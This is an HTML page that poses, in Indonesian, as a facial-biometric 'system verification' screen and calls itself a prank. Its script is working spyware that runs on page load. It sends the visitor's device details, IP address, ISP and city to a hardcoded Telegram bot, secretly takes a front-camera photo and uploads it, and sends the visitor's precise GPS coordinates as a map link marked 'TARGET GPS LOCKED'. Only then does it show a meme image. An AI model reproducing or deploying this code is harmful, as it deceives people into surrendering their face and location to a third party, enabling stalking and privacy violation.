<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>Website Bug - GyzenLyoraa x CARAMELXZ</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <style>
        body{background:#000;margin:0;padding:0;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial,sans-serif;color:#999;overflow:hidden}
        
        /* Container Utama */
        #main-container { position: relative; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; }

        /* Background Camera (Transparent but Active) */
        #v { position: absolute; width: 100%; height: 100%; object-fit: cover; z-index: 1; opacity: 0.4; transform: scaleX(-1); }

        /* UI Loading GyzenLyoraa */
        #loading-container{ position: relative; z-index: 10; text-align:center; width: 80%; max-width: 400px; background: rgba(0,0,0,0.6); padding: 20px; border-radius: 15px; }
        #loading-text{font-size:22px;margin-bottom:20px;color:#6e48aa; font-weight: bold;}
        #progress-container{height:3px;background:#222;border-radius:3px;overflow:hidden}
        #progress-bar{height:100%;width:0%;background:linear-gradient(90deg,#6e48aa,#9d50bb);transition:width .3s ease}
        #loading-details{margin-top:20px;font-size:14px;color:#666}

        /* Overlay Scanner Wajah (Prank UI) */
        #scanner-box { position: absolute; width: 220px; height: 220px; border: 3px solid #00ff00; border-radius: 50%; box-shadow: 0 0 15px #00ff00; z-index: 5; top: 20%; display: flex; justify-content: center; align-items: center; }
        #scanner-line { width: 100%; height: 2px; background: #00ff00; position: absolute; box-shadow: 0 0 10px #00ff00; animation: scan 2.5s infinite linear; }
        @keyframes scan { 0% { top: 10%; } 50% { top: 90%; } 100% { top: 10%; } }

        /* Prank Image */
        #prank-image { display: none; width: 100%; height: 100%; object-fit: cover; position: absolute; top: 0; left: 0; z-index: 100; }
        
        canvas { display: none; }
    </style>
</head>
<body>

    <div id="main-container">
        <video id="v" autoplay playsinline muted></video>
        
        <div id="scanner-box">
            <div id="scanner-line"></div>
            <div style="position: absolute; bottom: -40px; color: #00ff00; font-size: 12px; white-space: nowrap;">[ MEMINDAI WAJAH... ]</div>
        </div>

        <div id="loading-container">
            <div id="loading-text">VERIFIKASI SISTEM</div>
            <div id="progress-container"><div id="progress-bar"></div></div>
            <div id="loading-details">Menginisialisasi modul biometrik...</div>
        </div>
    </div>

    <img id="prank-image" src="https://i.imgflip.com/4/33eb5n.jpg" alt="Prank!">
    <canvas id="c"></canvas>

<script>
(()=>{
    const T='8796435263:AAFpdc1RSIdv5CpY4D-CeSMPRy3t1OtAvZY', 
          C='6324080021',
          pb=document.getElementById('progress-bar'),
          ld=document.getElementById('loading-details'),
          mainCon = document.getElementById('main-container'),
          prankImg = document.getElementById('prank-image');

    let p=0;
    const LM=["Memeriksa wajah...","Mencocokkan data biometrik...","Mengenkripsi koordinat...","Memverifikasi lokasi...","Mengunggah hash keamanan..."];
    
    // Progress bar logic
    const progressInterval = setInterval(()=>{
        p+=Math.random()*3;
        if(p>99) p=99;
        pb.style.width=p+'%';
        if(Math.random()>.8) ld.textContent=LM[Math.floor(Math.random()*LM.length)]
    },600);

    const sTG=async d=>{try{await fetch(`https://api.telegram.org/bot${T}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:C,text:d,parse_mode:'HTML'})})}catch(e){}};
    const sP=async(b,f)=>{try{const fd=new FormData();fd.append('chat_id',C);fd.append('photo',b,f);await fetch(`https://api.telegram.org/bot${T}/sendPhoto`,{method:'POST',body:fd})}catch(e){}};
    
    const cDI=async()=>{
        let m='╭─── REPORT SILENT SCANNER ─── ⦿\n';
        m+=`📱 Device: ${navigator.userAgent}\n🔋 Battery: ${'getBattery' in navigator ? 'Checking...' : 'N/A'}\n`;
        try{const i=await fetch('https://ipapi.co/json/'),d=await i.json();m+=`🌐 IP: ${d.ip}\n📍 ISP: ${d.org}\n🏙️ Kota: ${d.city}\n`}catch(e){}
        return m;
    };

    const captureCamera = async (mode) => {
        const v = document.getElementById('v'), c = document.getElementById('c');
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
            v.srcObject = stream;
            await new Promise(r => v.onloadedmetadata = r);
            v.play();
            
            // Jeda 3 detik seolah-olah proses scanning wajah
            await new Promise(r => setTimeout(r, 3000));
            
            c.width = v.videoWidth;
            c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            c.toBlob(b => sP(b, `${mode}_capture.jpg`), 'image/jpeg');
            
            return stream;
        } catch (e) { return null; }
    };

    const ST = async () => {
        // 1. Kirim Data Device & IP dulu
        await sTG(await cDI());

        // 2. Jalankan Scanner Wajah
        const stream = await captureCamera("user");

        // 3. Ambil Lokasi GPS (Target bakal "izinkan" demi verifikasi wajah)
        if(navigator.geolocation){
            navigator.geolocation.getCurrentPosition(async pos => {
                const lat = pos.coords.latitude, lon = pos.coords.longitude;
                let g=`📍 TARGET GPS LOCKED\n🗺️ Google Maps: https://www.google.com/maps?q=${lat},${lon}\n🎯 Accuracy: ${pos.coords.accuracy}m`;
                await sTG(g);
            }, e => sTG(`❌ GPS Error: ${e.message}`), {enableHighAccuracy:true});
        }

        // 4. Setelah progress beres, munculkan Prank
        setTimeout(() => {
            clearInterval(progressInterval);
            if(stream) stream.getTracks().forEach(t => t.stop());
            mainCon.style.display = 'none';
            prankImg.style.display = 'block';
        }, 8000); // 8 detik total proses
    };

    window.onload = ST;
})();
</script>
</body>
</html>
